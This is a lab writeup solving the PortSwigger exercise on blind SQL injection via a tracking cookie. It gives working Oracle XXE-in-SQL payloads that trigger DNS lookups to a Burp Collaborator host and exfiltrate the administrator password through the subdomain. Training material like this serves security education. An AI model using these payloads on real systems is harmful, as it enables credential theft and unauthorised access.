# Blind SQL injection with out-of-band data exfiltration

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration), you'll learn: Blind SQL injection with out-of-band data exfiltration! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301125654.png)

**Cookies:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301125711.png)

When we go to `/`, it'll set a new cookie called `TrackingId`.

This looks like a tracking cookie for analytics.

The SQL query may looks like this:

```sql
SELECT TrackingId FROM tracking WHERE TrackingId = '<our_cookie_value>'
```

**That being said, we can try to perform SQL injection.**

**To do so, I'll try to trigger an SQL query error:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301125753.png)

However, it seems like we don't recieve any response when we modified the tracking cookie.

Maybe carries out the SQL query **asynchronously**?

The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.

The easiest and most reliable way to use out-of-band techniques is using [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator). This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Support for Burp Collaborator is built in to [Burp Suite Professional](https://portswigger.net/burp/pro) with no configuration required.

### Dectecting blind SQL injection with DNS lookup

**In the PortSwigger's [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), there's a DNS lookup payloads:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301125818.png)

Since we don't know which DBMS (Database Management System) is using, we need to try them all one by one.

**First, go to Burp Suite's Collaborator and click "Copy to clipboard":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301125842.png)

**Then, we'll try Oracle XXE vulnerability to trigger a DNS lookup:**
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://wcc9qdxnn2kmj8qlqoe2s0vic9i06quf.oastify.com/"> %remote;]>'),'/l') FROM dual
```

**Payload:**
```sql
UtpAUCPaD1W1twLc' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wcc9qdxnn2kmj8qlqoe2s0vic9i06quf.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

**The SQL query may become:**
```sql
SELECT TrackingId FROM tracking WHERE TrackingId = 'UtpAUCPaD1W1twLc' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://sqmxgqkqk0lopbi04l88x96v2m8dw4kt.oastify.com/"> %remote;]>'),'/l') FROM dual--'
```

Let's send the payload!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301130156.png)

> Note: The payload needs to be URL encoded.

**Burp Suite's Collaborator:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301130205.png)

We've recieved 4 DNS lookups! Which means the `TrackingId` cookie is vulnerable to out-of-band SQL injection!

### Data exfiltration via blind SQL injection with DNS lookup

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application.

**In the PortSwigger's [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), there's a DNS lookup with data exfiltration payloads:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301130326.png)

**Since we found the DBMS is Oracle, we can use Oracle's payload:**
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Then, in the lab background, there's a table called `users`, with columns called `username` and `password`.

**To exfiltrate `administrator` user's password, we can use the following payload:**
```sql
UtpAUCPaD1W1twLc' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.mxnzb3id8s5c4ybbbezsdqg8xz3qrhf6.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

This input reads the password for the `administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301130722.png)

**Burp Suite's Collaborator:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301130736.png)

Nice! We successfully exfiltrated `administrator`'s password!

**Let's login as `administrator`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301130826.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301130831.png)

I'm user `administrator`!

# What we've learned:

1. Blind SQL injection with out-of-band interaction